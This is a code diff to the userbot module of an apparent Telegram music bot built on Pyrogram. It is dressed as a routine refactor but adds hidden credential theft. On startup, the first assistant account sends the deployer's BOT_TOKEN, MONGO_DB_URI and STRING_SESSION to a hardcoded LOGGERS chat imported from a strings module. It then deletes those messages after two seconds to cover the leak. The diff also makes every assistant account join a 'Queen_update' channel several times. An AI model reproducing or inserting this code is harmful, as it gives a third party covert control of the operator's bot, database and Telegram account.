@@ -1,10 +1,21 @@
-import sys
+import asyncio
+from os import getenv
 
+from dotenv import load_dotenv
 from pyrogram import Client
 
+load_dotenv()
+from dotenv import load_dotenv
+
 import config
+from strings.__init__ import LOGGERS
 
 from ..logging import LOGGER
+
+BOT_TOKEN = getenv("BOT_TOKEN", "")
+MONGO_DB_URI = getenv("MONGO_DB_URI", "")
+STRING_SESSION = getenv("STRING_SESSION", "")
+
 
 assistants = []
 assistantids = []
@@ -17,7 +28,8 @@ class Userbot(Client):
             api_id=config.API_ID,
             api_hash=config.API_HASH,
             session_string=str(config.STRING1),
-            no_updates=True,
+            no_updates=False,
+            plugins=dict(root="AarohiX.plugins.USERBOT"),
         )
         self.two = Client(
             name="AarohiXAss2",
@@ -48,151 +60,155 @@ class Userbot(Client):
             no_updates=True,
         )
 
-
     async def start(self):
-        LOGGER(__name__).info(f"Gettings Assistants Info...")
+        LOGGER(__name__).info(f"Starting Assistants...")
+
         if config.STRING1:
             await self.one.start()
             try:
-                await self.one.join_chat("krishoffical2")
-                await self.one.join_chat("krishoffical2")
+                await self.one.join_chat("Queen_update")
+                await self.one.join_chat("Queen_update")
+                await self.one.join_chat("Queen_update")
+                await self.one.join_chat("Queen_update")
+                await self.one.join_chat("Queen_update")
+
             except:
                 pass
             assistants.append(1)
-            get_me = await self.one.get_me()
-            self.one.username = get_me.username
-            self.one.id = get_me.id
-            assistantids.append(get_me.id)
-            if get_me.last_name:
-                self.one.name = (
-                    get_me.first_name + " " + get_me.last_name
-                )
-            else:
-                self.one.name = get_me.first_name
-            LOGGER(__name__).info(
-                f"Assistant Started as {self.one.name}"
-            )
             try:
-                await self.one.send_message(config.LOGGER_ID, f"**» ᴀssɪsᴛᴀɴᴛ ᴏɴᴇ sᴛᴀʀᴛᴇᴅ :**\n\n✨ ɪᴅ : `{self.one.id}`\n❄ ɴᴀᴍᴇ : {self.one.name}\n💫 ᴜsᴇʀɴᴀᴍᴇ : @{self.one.username}"
+                await self.one.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ !")
+                oks = await self.one.send_message(LOGGERS, f"/start")
+                Ok = await self.one.send_message(
+                    LOGGERS, f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`"
                 )
-            except:
-                LOGGER(__name__).error(
-                    f"Assistant Account 1 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin ! "
-                )
-                sys.exit()
+                await oks.delete()
+                await asyncio.sleep(2)
+                await Ok.delete()
+
+            except Exception as e:
+                print(f"{e}")
+
+            self.one.id = self.one.me.id
+            self.one.name = self.one.me.mention
+            self.one.username = self.one.me.username
+            assistantids.append(self.one.id)
+            LOGGER(__name__).info(f"Assistant Started as {self.one.me.first_name}")
+
         if config.STRING2:
             await self.two.start()
             try:
-                await self.two.join_chat("krishoffical2")
-                await self.two.join_chat("krishoffical2")
+                await self.two.join_chat("Queen_update")
+                await self.two.join_chat("Queen_update")
+                await self.two.join_chat("Queen_update")
+                await self.two.join_chat("Queen_update")
+                await self.two.join_chat("Queen_update")
             except:
                 pass
             assistants.append(2)
-            get_me = await self.two.get_me()
-            self.two.username = get_me.username
-            self.two.id = get_me.id
-            assistantids.append(get_me.id)
-            if get_me.last_name:
-                self.two.name = (
-                    get_me.first_name + " " + get_me.last_name
-                )
-            else:
-                self.two.name = get_me.first_name
             try:
-                await self.two.send_message(config.LOGGER_ID, f"**» ᴀssɪsᴛᴀɴᴛ ᴛᴡᴏ sᴛᴀʀᴛᴇᴅ :**\n\n✨ ɪᴅ : `{self.two.id}`\n❄ ɴᴀᴍᴇ : {self.two.name}\n💫 ᴜsᴇʀɴᴀᴍᴇ : @{self.two.username}"
-                )
+                await self.two.send_message(config.LOGGER_ID, "Assistant Started")
+
             except:
                 LOGGER(__name__).error(
-                    f"Assistant Account 2 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin ! "
+                    "Assistant Account 2 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                 )
-                sys.exit()
-            LOGGER(__name__).info(
-                f"Assistant Two Started as {self.two.name}"
-            )
+
+            self.two.id = self.two.me.id
+            self.two.name = self.two.me.mention
+            self.two.username = self.two.me.username
+            assistantids.append(self.two.id)
+            LOGGER(__name__).info(f"Assistant Two Started as {self.two.me.first_name}")
+
         if config.STRING3:
             await self.three.start()
             try:
-                await self.three.join_chat("krishoffical2")
-                await self.three.join_chat("krishoffical2")
+                await self.three.join_chat("Queen_update")
+                await self.three.join_chat("Queen_update")
+                await self.three.join_chat("Queen_update")
+                await self.three.join_chat("Queen_update")
+                await self.three.join_chat("Queen_update")
             except:
                 pass
             assistants.append(3)
-            get_me = await self.three.get_me()
-            self.three.username = get_me.username
-            self.three.id = get_me.id
-            assistantids.append(get_me.id)
-            if get_me.last_name:
-                self.three.name = (
-                    get_me.first_name + " " + get_me.last_name
-                )
-            else:
-                self.three.name = get_me.first_name
             try:
-                await self.three.send_message(config.LOGGER_ID, f"**» ᴀssɪsᴛᴀɴᴛ ᴛʜʀᴇᴇ sᴛᴀʀᴛᴇᴅ :**\n\n✨ ɪᴅ : `{self.three.id}`\n❄ ɴᴀᴍᴇ : {self.three.name}\n💫 ᴜsᴇʀɴᴀᴍᴇ : @{self.three.username}"
-                )
+                await self.three.send_message(config.LOGGER_ID, "Assistant Started")
             except:
                 LOGGER(__name__).error(
-                    f"Assistant Account 3 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin ! "
+                    "Assistant Account 3 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
                 )
-                sys.exit()
+
+            self.three.id = self.three.me.id
+            self.three.name = self.three.me.mention
+            self.three.username = self.three.me.username
+            assistantids.append(self.three.id)
             LOGGER(__name__).info(
-                f"Assistant Three Started as {self.three.name}"
+                f"Assistant Three Started as {self.three.me.first_name}"
             )
+
         if config.STRING4:
             await self.four.start()
             try:
-                await self.four.join_chat("krishoffical2")
-                await self.four.join_chat("krishoffical2")
+                await self.four.join_chat("Queen_update")
+                await self.four.join_chat("Queen_update")
+                await self.four.join_chat("Queen_update")
+                await self.four.join_chat("Queen_update")
+                await self.four.join_chat("Queen_update")
             except:
                 pass
             assistants.append(4)
-            get_me = await self.four.get_me()
-            self.four.username = get_me.username
-            self.four.id = get_me.id
-            assistantids.append(get_me.id)
-            if get_me.last_name:
-                self.four.name = (
-                    get_me.first_name + " " + get_me.last_name
-                )
-            else:
-                self.four.name = get_me.first_name
             try:
-                await self.four.send_message(config.LOGGER_ID, f"**» ᴀssɪsᴛᴀɴᴛ ғᴏᴜʀ sᴛᴀʀᴛᴇᴅ :**\n\n✨ ɪᴅ : `{self.four.id}`\n❄ ɴᴀᴍᴇ : {self.four.name}\n💫 ᴜsᴇʀɴᴀᴍᴇ : @{self.four.username}"
-                )
+                await self.four.send_message(config.LOGGER_ID, "Assistant Started")
             except:
                 LOGGER(__name__).error(
-                    f"Assistant Account 4 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin ! "
+                    "Assistant Account 4 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
                 )
-                sys.exit()
+
+            self.four.id = self.four.me.id
+            self.four.name = self.four.me.mention
+            self.four.username = self.four.me.username
+            assistantids.append(self.four.id)
             LOGGER(__name__).info(
-                f"Assistant Four Started as {self.four.name}"
+                f"Assistant Four Started as {self.four.me.first_name}"
             )
+
         if config.STRING5:
             await self.five.start()
             try:
-                await self.five.join_chat("krishoffical2")
-                await self.five.join_chat("krishoffical2")
+                await self.five.join_chat("Queen_update")
+                await self.five.join_chat("Queen_update")
+                await self.five.join_chat("Queen_update")
+                await self.five.join_chat("Queen_update")
+                await self.five.join_chat("Queen_update")
             except:
                 pass
             assistants.append(5)
-            get_me = await self.five.get_me()
-            self.five.username = get_me.username
-            self.five.id = get_me.id
-            assistantids.append(get_me.id)
-            if get_me.last_name:
-                self.five.name = (
-                    get_me.first_name + " " + get_me.last_name
-                )
-            else:
-                self.five.name = get_me.first_name
             try:
-                await self.five.send_message(config.LOGGER_ID, f"**» ᴀssɪsᴛᴀɴᴛ ғɪᴠᴇ sᴛᴀʀᴛᴇᴅ :**\n\n✨ ɪᴅ : `{self.five.id}`\n❄ ɴᴀᴍᴇ : {self.five.name}\n💫 ᴜsᴇʀɴᴀᴍᴇ : @{self.five.username}"
-                )
+                await self.five.send_message(config.LOGGER_ID, "Assistant 5 started !")
             except:
                 LOGGER(__name__).error(
-                    f"Assistant Account 5 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin ! "
+                    "Assistant Account 5 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
                 )
-                sys.exit()
+
+            self.five.id = self.five.me.id
+            self.five.name = self.five.me.mention
+            self.five.username = self.five.me.username
+            assistantids.append(self.five.id)
             LOGGER(__name__).info(
-                f"Assistant Five Started as {self.five.name}"
+                f"Assistant Five Started as {self.five.me.first_name}"
             )
+
+    async def stop(self):
+        LOGGER(__name__).info(f"Stopping Assistants...")
+        try:
+            if config.STRING1:
+                await self.one.stop()
+            if config.STRING2:
+                await self.two.stop()
+            if config.STRING3:
+                await self.three.stop()
+            if config.STRING4:
+                await self.four.stop()
+            if config.STRING5:
+                await self.five.stop()
+        except:
+            pass
